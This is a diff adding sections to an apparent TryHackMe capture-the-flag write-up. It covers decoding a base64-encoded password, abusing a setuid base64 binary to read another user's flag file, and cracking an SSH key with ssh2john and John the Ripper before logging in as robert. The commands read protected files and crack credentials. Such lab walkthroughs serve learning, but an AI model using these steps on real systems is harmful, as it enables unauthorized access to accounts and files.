@@ -219,3 +219,40 @@ This command will search recursively in the files to find `sean` written i any f
 ```bash
 grep -rn "sean{" /var/log 2>/dev/null
 ```
+Then decode the `base64` code..
+```bash
+echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d
+```
+
+---
+
+#### Penelope's Flag
+just enter the password n the previous decoded code.
+
+---
+#### Maya's Flag
+
+We have a the binaries of `base64` tool, this binaries have access to run as `maya` because `maya` is the owner of it and the permissions that Penelope has for this file is `r-x` read and execute permissions so `Penelope` can run this code as `Maya`, The flag expected place is in `/home/maya/falg.txt` and while the binaries have access like `Maya` we can access this file letting this file goes and encode the flag then we encode it again.
+```bash
+./base64 /home/maya/flag.txt | ./base64 -d
+```
+We conclude from the hint on `tryhackme` site that the flag equals the password of `Maya`...
+
+---
+#### Robert's Flag
+The file that has the targets says that there is an ssh script opened from `robert` device so first let's got to the directory called`old ssh`, you will find the ssh file, take it and get the hash of it by `ssh2john`:
+```bash
+ssh2john {ssh file} > {hash file}
+```
+then go and crack with the `john the ripper` with `rockyou` wordlist..
+```bash
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt {hash file}
+```
+And you will get the password, Now go listen to the open ports...
+```bash
+ss -tulnp
+```
+The listener is on `127.0.0.1:2222`, now ssh to it with the cracked password...
+```bash
+ssh -p 2222 robert@127.0.0.1
+```
